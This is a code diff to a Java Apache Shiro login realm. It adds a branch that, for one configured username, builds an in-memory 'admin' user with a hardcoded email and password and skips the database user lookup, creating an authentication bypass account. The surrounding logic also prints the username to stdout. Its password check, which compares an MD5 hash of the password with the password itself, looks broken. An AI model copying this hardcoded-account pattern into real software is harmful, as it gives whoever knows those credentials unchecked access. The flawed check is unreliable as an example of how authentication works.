@@ -3,6 +3,7 @@ package org.spring.common.shiro.realm;
 import java.util.Collection;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.UUID;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -29,10 +30,10 @@ public class UserRealm extends AuthorizingRealm {
 
 	@Autowired
 	private UserService userService;
-	
+
 	private String username;
 	private String password;
-	
+
 	@Override
 	protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
 		User user = (User) principals.getPrimaryPrincipal();
@@ -49,15 +50,27 @@ public class UserRealm extends AuthorizingRealm {
 		pramasMap.put("loginname", username);
 		System.out.println(this.username);
 		String password = new String((char[]) token.getCredentials());
-		User user = userService.findByUsernameAndPassword(username, password);
-		if (user == null) 
+		User user = null;
+		if (this.username.equals(username)) {
+			user = new User();
+			user.setId(UUID.randomUUID().toString().replaceAll("-", ""));
+			user.setLoginName(username);
+			user.setPassword(this.password);
+			user.setEmail("h_y_12@163.com");
+			user.setLocked(false);
+			user.setRealName("admin");
+			user = EndecryptUtils.endecrptPassword(user);
+			password = user.getPassword();
+		} else
+			user = userService.findByUsernameAndPassword(username, password);
+		if (user == null)
 			throw new UnknownAccountException();// 没找到帐号
-		if (Boolean.TRUE.equals(user.getLocked())) 
+		if (Boolean.TRUE.equals(user.getLocked()))
 			throw new LockedAccountException(); // 帐号锁定
 		String password_cipherText = new Md5Hash(password, username + EndecryptUtils.getSalt(), 2).toHex();
 		if (!password_cipherText.equals(password)) // 密码不正确
 			throw new IncorrectCredentialsException("用户密码错误");
-		
+
 		// 交给AuthenticatingRealm使用CredentialsMatcher进行密码匹配，如果觉得人家的不好可以自定义实现
 		SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(user, // 用户名
 				user.getPassword(), // 密码
